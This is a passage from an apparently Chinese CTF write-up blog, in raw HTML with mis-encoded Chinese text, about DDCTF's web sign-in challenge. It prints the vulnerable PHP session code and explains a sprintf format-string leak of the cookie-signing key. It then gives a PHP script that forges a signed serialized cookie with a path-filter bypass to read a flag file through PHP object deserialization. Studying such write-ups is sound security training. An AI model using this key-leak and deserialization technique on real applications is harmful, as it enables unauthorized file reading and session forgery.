class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></p><h1 id="WEB-ç­¾åˆ°é¢˜"><a href="#WEB-ç­¾åˆ°é¢˜" class="headerlink" title="WEB ç­¾åˆ°é¢˜"></a>WEB ç­¾åˆ°é¢˜</h1><p>è€ƒç‚¹:<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">sprintf</span><span class="params">()</span></span>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</span><br></pre></td></tr></table></figure></p><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g27xiygunkj30vz0ctdg5.jpg" alt=""><br>å‘ç°è°ƒç”¨äº†Auth.php,å¹¶ä¸”æœ‰ä¸ªdidictf_usernameå‚æ•°<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g27xqddfg3j30x30hpdhd.jpg" alt=""><br>è®¿é—®Auth.php<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g27xrev326j30tz0a1t9c.jpg" alt=""><br>å½“åŠ ä¸Šdidictf_username = adminè¿™ä¸ªå¤´<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g27xsbpnyaj30u40cfjs5.jpg" alt=""><br>è®¿é—® app/fL2XID2i0Cdh.php<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g2820kx99yj30qv0hk0tj.jpg" alt=""><br>å…¶ä¸­app/Application.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">Application</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $path = <span class="string">''</span>; <span class="comment">//å®šä¹‰ä¸€ä¸ªå…¬å…±å˜é‡$path</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">response</span><span class="params">($data, $errMsg = <span class="string">'success'</span>)</span> </span>&#123;</span><br><span class="line">        $ret = [<span class="string">'errMsg'</span> =&gt; $errMsg,    <span class="comment">//åˆ›å»ºä¸€ä¸ªphpæ•°ç»„ï¼Œå…¶ä¸­ä»å½¢å‚è·å–ä¸¤ä¸ªå€¼è½¬åŒ–ä¸ºæ•°ç»„å€¼ã€‚</span></span><br><span class="line">            <span class="string">'data'</span> =&gt; $data];</span><br><span class="line">        $ret = json_encode($ret);</span><br><span class="line">        header(<span class="string">'Content-type: application/json'</span>); <span class="comment">//å®šä¹‰httpå¤´jsonå†…å®¹ç±»å‹</span></span><br><span class="line">        <span class="keyword">echo</span> $ret;  <span class="comment">//æ˜¾ç¤ºæ•°æ®åŠ å¯†åçš„jsonæ•°æ®</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">auth</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $DIDICTF_ADMIN = <span class="string">'admin'</span>;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($_SERVER[<span class="string">'HTTP_DIDICTF_USERNAME'</span>]) &amp;&amp; $_SERVER[<span class="string">'HTTP_DIDICTF_USERNAME'</span>] == $DIDICTF_ADMIN) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;response(<span class="string">'æ‚¨å½“å‰å½“å‰æƒé™ä¸ºç®¡ç†å‘˜----è¯·è®¿é—®:app/fL2XID2i0Cdh.php'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">TRUE</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;response(<span class="string">'æŠ±æ­‰ï¼Œæ‚¨æ²¡æœ‰ç™»é™†æƒé™ï¼Œè¯·è·å–æƒé™åè®¿é—®-----'</span>,<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">sanitizepath</span><span class="params">($path)</span> </span>&#123;  <span class="comment">//ä¼ å…¥ä¸€ä¸ªå˜é‡$path</span></span><br><span class="line">    $path = trim($path);  <span class="comment">//åˆ é™¤$pathé¦–ä½ç©º</span></span><br><span class="line">    $path=str_replace(<span class="string">'../'</span>,<span class="string">''</span>,$path);  <span class="comment">// ../ æ›¿æ¢ä¸º ç©º</span></span><br><span class="line">    $path=str_replace(<span class="string">'..\\'</span>,<span class="string">''</span>,$path); <span class="comment">// ..\\ æ›¿æ¢ä¸º ç©º</span></span><br><span class="line">    <span class="keyword">return</span> $path; <span class="comment">//è¿”å›$path</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;path)) &#123;  <span class="comment">// å¦‚æœ$pathä¸ºç©ºï¼Œå°±ç›´æ¥ç»“æŸäº†</span></span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $path = <span class="keyword">$this</span>-&gt;sanitizepath(<span class="keyword">$this</span>-&gt;path); <span class="comment">// ä¸ä¸ºç©ºå°±è°ƒç”¨sanitizepath()åšæ›¿æ¢</span></span><br><span class="line">        <span class="keyword">if</span>(strlen($path) !== <span class="number">18</span>) &#123;  <span class="comment">//å¦‚æœå¤„ç†è¿‡çš„$pathé•¿åº¦ä¸ä¸¥æ ¼ç­‰äº18ï¼Œå°±è·³å‡º</span></span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;response($data=file_get_contents($path),<span class="string">'Congratulations'</span>);</span><br><span class="line">    &#125;   <span class="comment">// æŠŠ$pathè¯»å–å‡ºæ¥ä»¥åä¼ å…¥response()</span></span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>app/Session.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">'Application.php'</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Session</span> <span class="keyword">extends</span> <span class="title">Application</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//keyå»ºè®®ä¸º8ä½å­—ç¬¦ä¸²</span></span><br><span class="line">    <span class="keyword">var</span> $eancrykey                  = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_expiration= <span class="number">7200</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_name                = <span class="string">'ddctf_id'</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_path= <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_domain= <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_secure= <span class="keyword">FALSE</span>;</span><br><span class="line">    <span class="keyword">var</span> $activity                   = <span class="string">"DiDiCTF"</span>;</span><br><span class="line">    <span class="comment">//å®šä¹‰äº†ä¸€å †ç±»å˜é‡</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">parent</span>::auth()) &#123; <span class="comment">//HTTP_DIDICTF_USERNAME: adminæ—¶æ‰èƒ½ç»§ç»­æ‰§è¡Œ</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;get_key(); <span class="comment">//è°ƒç”¨get_key()</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;session_read()) &#123; <span class="comment">//å¦‚æœsession_read()è¿”å›ä¸ºTRUEå°±è¿›å…¥ä¸‹é¢ä¸‰è¡Œ</span></span><br><span class="line">                $data = <span class="string">'DiDI Welcome you %s'</span>;</span><br><span class="line">                $data = sprintf($data,$_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]);</span><br><span class="line">                <span class="keyword">parent</span>::response($data,<span class="string">'sucess'</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;<span class="comment">//å¦‚æœsession_read()è¿”å›ä¸ºFLASEï¼Œå°±è°ƒç”¨session_create()</span></span><br><span class="line">                <span class="keyword">$this</span>-&gt;session_create();</span><br><span class="line">                $data = <span class="string">'DiDI Welcome you'</span>;</span><br><span class="line">                <span class="keyword">parent</span>::response($data,<span class="string">'sucess'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">get_key</span><span class="params">()</span> </span>&#123; <span class="comment">// è·å–eancrykeyï¼Œhint: ../config/flag.txt</span></span><br><span class="line">        <span class="comment">//eancrykey  and flag under the folder</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;eancrykey =  file_get_contents(<span class="string">'../config/key.txt'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">session_read</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>($_COOKIE)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $session = $_COOKIE[<span class="keyword">$this</span>-&gt;cookie_name];</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>($session)) &#123;</span><br><span class="line">            <span class="keyword">parent</span>::response(<span class="string">"session not found"</span>,<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $hash = substr($session,strlen($session)<span class="number">-32</span>);</span><br><span class="line">        $session = substr($session,<span class="number">0</span>,strlen($session)<span class="number">-32</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($hash !== md5(<span class="keyword">$this</span>-&gt;eancrykey.$session)) &#123;</span><br><span class="line">            <span class="keyword">parent</span>::response(<span class="string">"the cookie data not match"</span>,<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $session = unserialize($session);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!is_array($session) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">'session_id'</span>]) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">'ip_address'</span>]) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">'user_agent'</span>]))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">"nickname"</span>])) &#123;</span><br><span class="line">            $arr = <span class="keyword">array</span>($_POST[<span class="string">"nickname"</span>],<span class="keyword">$this</span>-&gt;eancrykey);</span><br><span class="line">            $data = <span class="string">"Welcome my friend %s"</span>;</span><br><span class="line">            <span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">                $data = sprintf($data,$v);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">parent</span>::response($data,<span class="string">"Welcome"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($session[<span class="string">'ip_address'</span>] != $_SERVER[<span class="string">'REMOTE_ADDR'</span>]) &#123;</span><br><span class="line">            <span class="keyword">parent</span>::response(<span class="string">'the ip addree not match'</span>.<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>($session[<span class="string">'user_agent'</span>] != $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]) &#123;</span><br><span class="line">            <span class="keyword">parent</span>::response(<span class="string">'the user agent not match'</span>,<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">TRUE</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">session_create</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $sessionid = <span class="string">''</span>;</span><br><span class="line">        <span class="keyword">while</span>(strlen($sessionid) &lt; <span class="number">32</span>) &#123;</span><br><span class="line">            $sessionid .= mt_rand(<span class="number">0</span>,mt_getrandmax());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $userdata = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">'session_id'</span> =&gt; md5(uniqid($sessionid,<span class="keyword">TRUE</span>)),</span><br><span class="line">            <span class="string">'ip_address'</span> =&gt; $_SERVER[<span class="string">'REMOTE_ADDR'</span>],</span><br><span class="line">            <span class="string">'user_agent'</span> =&gt; $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>],</span><br><span class="line">            <span class="string">'user_data'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        $cookiedata = serialize($userdata);</span><br><span class="line">        $cookiedata = $cookiedata.md5(<span class="keyword">$this</span>-&gt;eancrykey.$cookiedata);</span><br><span class="line">        $expire = <span class="keyword">$this</span>-&gt;cookie_expiration + time();</span><br><span class="line">        setcookie(</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_name,</span><br><span class="line">            $cookiedata,</span><br><span class="line">            $expire,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_path,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_domain,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_secure</span><br><span class="line">            );</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ddctf = <span class="keyword">new</span> Session();</span><br><span class="line">$ddctf-&gt;index();</span><br></pre></td></tr></table></figure></p><p>Application.phpé‡Œé¢æ˜¯ä¸€ä¸ªApplicationç±»ï¼Œæœ‰ä¸€ä¸ªä¸ºç©ºçš„å…¬å…±å˜é‡$pathï¼Œä¸‰ä¸ªå…¬å…±æ–¹æ³•response()ã€auth()å’Œ__destruct()ï¼Œè¿˜æœ‰ä¸€ä¸ªç§æœ‰æ–¹æ³•sanitizepath()ã€‚</p><p>response()æ–¹æ³•èƒ½æŠŠä¼ å…¥çš„ä¸¤ä¸ªæ•°æ®ç”¨jsonæ ¼å¼åŒ–åæ‰“å°å‡ºæ¥ï¼Œauth()æ–¹æ³•è¿›è¡Œè®¿é—®è€…çš„æƒé™æ ¡éªŒï¼Œåˆšå¼€å§‹çš„didictf_usernameå°±æ˜¯åœ¨æ­¤è¿›è¡Œæ ¡éªŒï¼Œè¿˜æœ‰ä¸€ä¸ª__destruct()ï¼Œè¿™æ˜¯ææ„æ–¹æ³•ï¼Œæ˜¯åœ¨æ–¹æ³•ä¸­æœ€åä¸€å®šä¼šæ‰§è¡Œçš„å‡½æ•°ï¼Œè¿™ä¸ªæ–¹æ³•é‡Œé¢çš„æ„æ€å°±æ˜¯ï¼šå¦‚æœ$pathä¸ä¸ºç©ºï¼Œå°±æŠŠ$pathç”¨sanitizepath()è¿‡æ»¤ä¸€ä¸‹ï¼Œå»é™¤ä¸€æ¬¡../å’Œ<code>..\\</code>ï¼Œç„¶åè¿‡æ»¤åçš„è·¯å¾„çš„é•¿åº¦å¦‚æœç­‰äº18ï¼Œå°±è¿›è¡Œè¯»å–ï¼Œå†æŠŠå†…å®¹ä¸¢ç»™response()æ–¹æ³•è¿›è¡Œæ˜¾ç¤ºã€‚</p><p>æ¥ä¸‹æ¥åˆ†æsession.php<br>ç”Ÿæˆä¸€ä¸ª 32 ä½çš„éšæœºsession_idå­—ç¬¦ä¸²ï¼Œç„¶å$userdataå°±æ˜¯æœ€å Session ä¸­çš„æ•°æ®ã€‚é‡Œé¢åŒ…å«äº†æˆ‘ä»¬çš„ IPï¼Œæµè§ˆå™¨ UA ç­‰ä¿¡æ¯ã€‚æœ€åä¼šå¯¹è¿™ä¸ªå­˜æœ‰ä¿¡æ¯çš„$userdataæ•°æ®è¿›è¡Œ PHP åºåˆ—åŒ–ã€‚åŒæ—¶ä¼šæŠŠåºåˆ—åŒ–çš„ç»“æœï¼Œä¸å¯†é’¥$eancrykeyæ‹¼æ¥ï¼Œåšä¸€æ¬¡ md5 åæ‹¼æ¥åœ¨ç»“æœåé¢ï¼Œèµ·åˆ°ç­¾åé˜²ä¼ªé€ çš„æ•ˆæœã€‚<br>æœ€åå°†æ•´ä¸ªç»“æœä»¥ Cookie çš„å½¢å¼å­˜åœ¨ç”¨æˆ·æœ¬åœ°ã€‚åŠ äº†ä¸ª$eancrykeyåš md5ï¼Œè¿™ç¡®å®æ˜¯ä¸ªä¸é”™çš„æœ¬åœ°å­˜ Cookie çš„æ–¹æ³•å•Š</p><p>è¯»å–çš„è¿‡ç¨‹å…¶å®ä¹Ÿå°±æ˜¯ç›¸åçš„ã€‚é¦–å…ˆæ˜¯æ£€æµ‹æœ‰æ²¡æœ‰åä¸ºddctf_idçš„ Cookieï¼Œæ²¡æœ‰çš„è¯å°±è¿”å›FALSEã€‚å¦‚æœæœ‰çš„è¯ï¼Œæˆªå–åé¢ 32 ä½ï¼Œå³é‚£æ®µ md5 çš„ç­¾åã€‚å†æˆªå–å‰é¢çš„å†…å®¹ï¼Œå³æ•°æ®æ­£æ–‡ã€‚ç”¨åŠ å¯†çš„æ–¹å¼æ£€éªŒä¸€ä¸‹ Cookie æœ‰æ²¡æœ‰è¢«ç¯¡æ”¹ã€‚æ²¡æœ‰çš„è¯ï¼Œå°±å¯¹æ•°æ®è¿›è¡Œ PHP ååºåˆ—åŒ–ã€‚æ£€æŸ¥æ•°æ®ä¸­çš„session_id ip_address ip_addresså…ƒç´ æ˜¯å¦å­˜åœ¨ã€‚<br>ç„¶ååˆ¤æ–­ä¸€ä¸‹æ˜¯å¦ä¼ å…¥äº†åä¸ºnicknameçš„ POST å‚æ•°ï¼Œå¦‚æœæœ‰çš„è¯ï¼Œå°±æ ¼å¼åŒ–å­—ç¬¦ä¸²è¾“å‡ºå‡ºæ¥ã€‚åé¢è¿˜å¯¹ip_addresså’Œip_addressåšäº†æ£€éªŒã€‚</p><p>è¿™é‡Œæˆ‘ä»¬ä¼ å…¥ä¿®æ”¹åçš„ Cookieï¼Œéƒ½éœ€è¦ç”¨$eancrykeyè¿›è¡Œæ£€éªŒï¼Œå› æ­¤å¾—æƒ³åŠæ³•å¾—åˆ°$eancrykeyçš„å€¼ï¼Œè¿™æ ·å°±å¯ä»¥ä¼ªé€  Cookie äº†ã€‚<br>å…¶ä¸­åœ¨get_key() æ³¨é‡Šå†™åˆ° flagå’Œeanccrykeyåœ¨åŒä¸€ä¸ªæ–‡ä»¶å¤¹<br>å› æ­¤å¾—æƒ³åŠæ³•å¾—åˆ°$eancrykeyçš„å€¼ï¼Œè¿™æ ·å°±å¯ä»¥ä¼ªé€  Cookie äº†ã€‚</p><p>åœ¨ä¼ å…¥nickname POST å‚æ•°æ—¶ï¼Œååˆ†è¿å’Œåœ°å‡ºç°äº†ä¸ª$eancrykeyã€‚è¿™é‡ŒæŠŠ<code>$_POST[&quot;nickname&quot;]</code>å’Œ$this-&gt;eancrykeyæ”¾åˆ°äº†åŒä¸€ä¸ªæ•°ç»„ä¸­ï¼Œä½¿ç”¨foreachå¾ªç¯åå†ä½¿ç”¨äº†æ ¼å¼åŒ–å­—ç¬¦ä¸²sprintf()ã€‚è¿™é‡Œæƒ³åˆ°äº†ä¸€ä¸ªå¾ˆæœºæ™ºçš„æ–¹æ³•ï¼šæˆ‘ä»¬åªéœ€è¦ POST è¯·æ±‚app/Session.phpï¼Œä¼ å…¥nicknameçš„å€¼ä¸º%sï¼Œç¬¬ä¸€æ¬¡æ ¼å¼åŒ–å­—ç¬¦ä¸²æ—¶ï¼Œä¼šæŠŠâ€Welcome my friend %sâ€ä¸­çš„%sæ¢æˆ%sï¼Œç¬¬äºŒå°±ä¼šæŠŠ%sæ¢æˆ$this-&gt;eancrykeyï¼Œè¿™æ ·æˆ‘ä»¬å°±å¾—åˆ°$eancrykeyäº†ã€‚</p><p>æ³¨æ„ï¼Œæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ä»£ç æ˜¯åœ¨session_read()æ–¹æ³•é‡Œçš„ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦å…ˆç©ºç™½è¯·æ±‚ä¸€æ¬¡ï¼Œæ‹¿åˆ°ä¸€ä¸ª Cookieï¼Œå†å¸¦ç€è¿™ä¸ª Cookie è¯·æ±‚ï¼Œè¿™æ ·æ‰èƒ½è¿›å…¥session_read()æ–¹æ³•ã€‚<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g2a9yzqwj5j30z00b4wfv.jpg" alt=""><br>è§£ä¸‹æ¥è·å–$eancrykey<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g2aa796vthj30w70ikjun.jpg" alt=""><br>æ³¨æ„: å°†getæ”¹ä¸ºpostï¼ŒåŒæ—¶åŠ ä¸ŠContent-Type: application/x-www-form-urlencoded<br>æ‹¿åˆ°$eancrykeyä¸ºEzblrbNS</p><p>æ¥ä¸‹æ¥è¿›è¡Œååºåˆ—åŒ–</p><p>è¿™é‡Œç»™äº†ä¸ª hint//eancrykey and flag under the folderï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦æƒ³åŠæ³•è¯»å–../config/æ–‡ä»¶å¤¹ä¸‹çš„ flagã€‚åœ¨Applicationç±»ä¸­çš„ææ„å‡½æ•°ä¸­ï¼Œæœ‰ä¸€ä¸ªfile_get_contents()å¯ä¾›æˆ‘ä»¬è¯»å–æ–‡ä»¶ã€‚å…¶ä¸­çš„å‚æ•°$pathæ¥è‡ªäºApplicationç±»ä¸­çš„$pathå±æ€§ã€‚è€Œ$pathå±æ€§çš„åˆå§‹å€¼æ˜¯ç©ºçš„ã€‚æ ¹æ®è¿™é‡Œå«æœ‰é­”æœ¯æ–¹æ³•__destruct()ï¼Œå¹¶ä¸”åé¢æœ‰unserialize()å‡½æ•°ï¼Œæƒ³åˆ°æˆ‘ä»¬å°è¯•å¯ä»¥é€šè¿‡ PHP ååºåˆ—åŒ–æ¥ä¿®æ”¹$pathçš„å€¼ã€‚</p><p>æ„é€ popé“¾</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">Class</span> <span class="title">Application</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">var</span> $path = <span class="string">'..././config/flag.txt'</span>;    <span class="comment">// éœ€è¦ä¿®æ”¹çš„å€¼</span></span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$eancrykey = <span class="string">'EzblrbNS'</span>;    <span class="comment">// è®¾ç½® $eancrykeyï¼Œç”¨äºç­¾ Cookie</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$userdata = <span class="keyword">array</span>(</span></span><br><span class="line"><span class="php">    <span class="string">'session_id'</span> =&gt; <span class="keyword">new</span> Application(),      <span class="comment">// åœ¨è¿™é‡Œè§¦å‘ååºåˆ—åŒ–</span></span></span><br><span class="line"><span class="php">    <span class="string">'ip_address'</span> =&gt; <span class="string">'xxx.xxx.xxx.xxx'</span>,</span></span><br><span class="line"><span class="php">    <span class="string">'user_agent'</span> =&gt; <span class="string">'ua'</span>,</span></span><br><span class="line"><span class="php">    <span class="string">'user_data'</span> =&gt; <span class="string">''</span></span></span><br><span class="line"><span class="php">);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$cookiedata = serialize($userdata);</span></span><br><span class="line"><span class="php">$cookiedata = $cookiedata.md5($eancrykey.$cookiedata);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span>($cookiedata);</span></span><br></pre></td></tr></table></figure><p>ddctf_id = a:4:{s:10:â€session_idâ€;O:11:â€Applicationâ€:1:{s:4:â€pathâ€;s:21:â€â€¦/./config/flag.txtâ€;}s:10:â€ip_addressâ€;s:15:â€xxx.xxx.xxx.xxxâ€;s:10:â€user_agentâ€;s:2:â€uaâ€;s:9:â€user_dataâ€;s:0:â€â€;}4d7f704737a8721321d75d580eea9cb2</p><p>ç¼–ç æäº¤ï¼Œå¾—åˆ°flag<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g2aapioo9rj311o0f8765.jpg" alt=""></p><h1 id="upload-img"><a href="#upload-img" class="headerlink" title="upload img"></a>upload img</h1><p> è€ƒç‚¹ : GDåº“äºŒæ¬¡æ¸²æŸ“</p><p> ä¸Šä¼ ä¸€å¼ 